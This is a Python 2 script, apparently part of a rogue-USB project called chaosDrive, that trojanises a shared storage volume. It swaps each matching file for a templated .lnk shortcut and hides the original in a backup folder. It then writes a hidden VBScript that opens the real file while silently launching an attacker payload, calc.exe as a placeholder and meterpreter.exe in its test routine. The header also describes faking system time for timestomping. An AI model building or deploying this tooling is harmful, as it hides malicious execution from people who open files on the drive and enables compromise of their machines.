#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
badlnk alchemy script for chaosDrive
- Looks on public lun (root only so far), replaces files with appropriately named
  link files
- These link files then call a vbscript that launches the target file and something of
  attacker's desire
"""

"""
Algo:
- Check templates directory for available templates by extension
- Set system time from target directory
- Set sttgt = 1
- Start vbscript generation
- Get file list from target directory; for each file:
    - Does extension match available template
        - YES:
            - Create "backup" directory
            - Mark directory as hidden
            - Copy lnk template to target directory
            - rename to match target file
            - set lnk sttgt number to match target file
            - move target file to backup
            - Add case statement to vbscript
            - Time stomp lnk file to match target file (?)
- Add vbscript closer
- Write vbscript to target directory
- Mark as hidden
- Done (?)            
"""

# Imports
import argparse
import os
import subprocess

def getAvailTemplates(templateDir="./templates"):
    # Returns a dictionary of extensions and the template file name to go with
    
    lnk_dict = {}
    for filename in os.listdir(templateDir):
        if filename.endswith(".lnk"):
            print "found file: {}".format(filename)
            lnk_dict[filename.split('.')[1]]=filename
        else:
            continue
    
    print lnk_dict
    return lnk_dict

def setSystemTime(targetDir):
    print "TESTING setSystemTime called"
    return
    f = subprocess.check_call(["/etc/chaos/fakentp.sh","-f",targetDir])
    return

def vbscript_start():
    # Returns start of vbscript
    snippet = 'Set colArgs = WScript.Arguments.Named\n'
    snippet += 'target = colArgs.Item("sttgt")\n'
    snippet += 'Select case target\n'
    return snippet

def vbscript_case(sttgt, filename):
    # Returns case statement entry like:
    # case "sttgt"
    # CreateObject("WScript.Shell").Run """filename""", 0, False
    snippet = 'case "{}"\n'.format(sttgt)
    snippet += 'CreateObject("WScript.Shell").Run """{}""", 0, False\n'.format(filename)
    return snippet

def vbscript_end(payload):
    # Returns end of vbscript
    snippet = 'End Select\n'
    snippet += 'CreateObject("WScript.Shell").Run """{}""", 0, False\n'.format(payload)
    return snippet

def writeVBscript(code, filename):
    with open(filename, "w") as script:
        script.write(code)
    return

# Some file manipulation code
# I prefer this to shutil
def copyfile(src, dst):
    f = subprocess.check_call(["cp",src,dst])
    return

def movefile(src,dst):
    f = subprocess.check_call(["mv",src,dst])
    return

def renamefile(src,dst):
    f = subprocess.check_call(["mv",src,dst])
    return

def setHiddenAttr(filename):
    print "TESTING setHiddenAttr called"
    return
    f = subprocess.check_call(["fatattr","+h",filename])
    return

def setLnkTarget(lnkfile, sttgt):
    with open(lnkfile, "r+") as lnk:
        # In the sample links I prepared, the file argument is always at 0x26D
        lnk.seek(0x26D)
        # got to love Windows text encoding
        lnk.write(sttgt.encode('utf-16_be'))
    
    return

def doBadLnk():
    # Check templates directory for available templates by extension
    lnk_dct = getAvailTemplates(template_dir)
    # Set system time from target directory
    setSystemTime(publicLUN)
    # Set sttgt = 1
    sttgt = 1
    # Start vbscript generation
    vbscript = vbscript_start()
    backup_dir = publicLUN + "/backup"
    # Get file list from target directory; for each file:
    tgt_dir = publicLUN
    for filename in os.listdir(tgt_dir):
        # get the file extension
        this_extension = filename.split(".")[-1]
        # In our dict?
        if this_extension in lnk_dct:
            # Create "backup" directory
            if not os.path.exists(backup_dir):
                os.mkdir(backup_dir)
                # Make it hidden
                setHiddenAttr(backup_dir)
            # Copy lnk template to target directory
            src = '{}/{}'.format(template_dir,lnk_dct[this_extension])
            dst = '{}/{}.lnk'.format(tgt_dir, filename)
            copyfile(src,dst)
            
            # set lnk sttgt number to match target file
            sttgt_str = '{:05d}'.format(sttgt)
            setLnkTarget(dst,sttgt_str)
            sttgt += 1
            
            # move target file to backup
            src = '{}/{}'.format(tgt_dir, filename)
            dst = '{}/{}'.format(backup_dir, filename)
            movefile(src,dst)
            
            # Add case statement to vbscript
            # Here we need to use relative paths
            vbscript_dst = 'backup/{}'.format(filename)
            vbscript += vbscript_case(sttgt_str, vbscript_dst)
            
            # next file
    # file Loop done
    # Add vbscript closer
    vbscript += vbscript_end("calc.exe")
    
    # Write vbscript to target directory
    payload_filename = '{}/{}'.format(tgt_dir, "startup.vbs")
    writeVBscript(vbscript, payload_filename)
    
    # Mark as hidden
    setHiddenAttr(payload_filename)

    return

# ------------ TESTS -------------
def vbtest():
    vbscript = vbscript_start()
    vbscript += vbscript_case("00001", "test1.txt")
    vbscript += vbscript_case("00002", "test2.txt")
    vbscript += vbscript_case("00003", "test3.txt")
    vbscript += vbscript_end("meterpreter.exe")
    writeVBscript(vbscript,"test.vbs")
    return
    


"""
description = 'Alchemy test for chaosDrive'
parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('--publicLUN', type=str)
parser.add_argument('--secretLUN', type=str)

args = parser.parse_args()

print args.publicLUN
print args.secretLUN

f = open(args.publicLUN+"/kilroyWasHere.txt", "w")
f.close()
"""

publicLUN="/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/testlun"
template_dir = "/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/templates"

#vbtest()
doBadLnk()